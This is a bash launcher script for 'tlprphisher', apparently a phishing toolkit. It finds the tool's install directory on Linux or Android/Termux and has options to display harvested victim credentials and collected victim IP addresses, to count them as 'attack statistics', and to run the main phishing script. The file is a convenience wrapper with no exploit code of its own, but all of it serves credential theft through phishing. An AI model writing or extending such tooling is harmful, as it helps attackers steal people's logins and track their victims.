#!/bin/bash

# Launcher for tlprphisher - https://github.com/sajadtlpr/tlprphisher

# Set install path based on Android/Termux
if [[ $(uname -o) == 'Android' ]]; then
  install_dirs=("/data/data/com.termux/files" "/sdcard" "/storage/emulated/0")
  for dir in "${install_dirs[@]}"; do
    if [[ -d "$dir/usr/opt/tlprphisher" ]]; then
      export TLPRPHISHER_ROOT="$dir/usr/opt/tlprphisher"
      break
    fi 
  done
else
  export TLPRPHISHER_ROOT="/opt/tlprphisher" 
fi

# Print help menu
if [[ $1 == '-h' || $1 == 'help' ]]; then

  echo "tlprphisher launcher script help:"
  echo
  echo "Usage: tlprphisher [options]"
  echo
  echo "Options:"
  echo "  -h, --help               Show this help message and exit"
  echo "  -c, --credentials        View saved credentials"
  echo "  -i, --ip                 View saved IP addresses"
  echo "  -s, --stats              View attack statistics"
  echo "  -f, --full-help          View full tlprphisher help menu"
  echo
  exit 0

# View credentials
elif [[ $1 == '-c' || $1 == '--credentials' ]]; then
  
  if [[ -s $TLPRPHISHER_ROOT/auth/usernames.dat ]]; then
    echo "Saved credentials:"
    cat $TLPRPHISHER_ROOT/auth/usernames.dat
  else
    echo "No credentials found!"
    exit 1
  fi

# View IP addresses  
elif [[ $1 == '-i' || $1 == '--ip' ]]; then

  if [[ -s $TLPRPHISHER_ROOT/auth/ip.txt ]]; then
    echo "Saved IP addresses:"
    cat $TLPRPHISHER_ROOT/auth/ip.txt
  else
    echo "No IP addresses found!"
    exit 1
  fi
  
# View attack stats
elif [[ $1 == '-s' || $1 == '--stats' ]]; then

  creds_count=$(wc -l < $TLPRPHISHER_ROOT/auth/usernames.dat 2>/dev/null)
  ip_count=$(wc -l < $TLPRPHISHER_ROOT/auth/ip.txt 2>/dev/null)

  echo "Attack statistics:"
  echo "- Total credentials collected: $creds_count"
  echo "- Total IP addresses collected: $ip_count"

# Print full help  
elif [[ $1 == '-f' || $1 == '--full-help' ]]; then
  $TLPRPHISHER_ROOT/tlprphisher.sh -h

# Launch main script  
else
  # Check script exists
  if [[ -f $TLPRPHISHER_ROOT/tlprphisher.sh ]]; then
    cd $TLPRPHISHER_ROOT
    bash ./tlprphisher.sh "$@"
  else
    echo "tlprphisher.sh not found in $TLPRPHISHER_ROOT"
    exit 1
  fi
fi
